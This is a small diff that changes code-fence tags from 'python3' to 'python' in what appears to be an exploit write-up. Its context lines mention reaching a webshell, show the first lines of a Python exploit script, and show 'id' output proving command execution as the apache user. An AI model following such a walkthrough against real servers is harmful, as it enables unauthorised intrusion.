@@ -141,7 +141,7 @@ But wait, we still weren't currently able to traverse to our webshell due to the
 
 Below you can see the final exploit:
 
-```python3
+```python
 import requests, sys
 
 if len(sys.argv) != 2:
@@ -225,7 +225,7 @@ Then a simple GET request to execute `id`:
 uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0 
 ```
 
-```python3
+```python
 import requests, sys
 
 if len(sys.argv) != 2:
